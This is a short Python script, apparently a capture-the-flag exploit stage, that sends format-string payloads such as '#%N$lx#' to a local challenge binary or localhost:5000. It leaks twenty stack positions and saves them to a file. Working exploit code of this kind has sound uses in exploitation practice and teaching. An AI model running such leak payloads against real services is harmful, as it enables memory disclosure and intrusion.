#!/usr/bin/env python
import ptrlib as ptr
import sys

from pwn import context, fmtstr_payload, ELF

elf = ptr.ELF("./og_patched")
libc = ptr.ELF("./libc.so.6")
ld = ptr.ELF("./ld-linux-x86-64.so.2")
context.binary = ELF(elf.filepath)


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return ptr.Socket("localhost", 5000)
    else:
        return ptr.Process(elf.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("unwrap failed")
        exit(1)
    else:
        return x


def main():
    dump = ""
    for i in range(20):
        io = connect()

        payload = f"#%{i+1}$lx#".encode()

        io.sendline(payload)
        io.recvuntil(b"#")
        dump += f'{i+1}: {io.recvuntil(b"#").strip(b"#").decode()}\n'
        io.close()

    with open("./dump2.txt", "w") as f:
        f.write(dump)


if __name__ == "__main__":
    main()
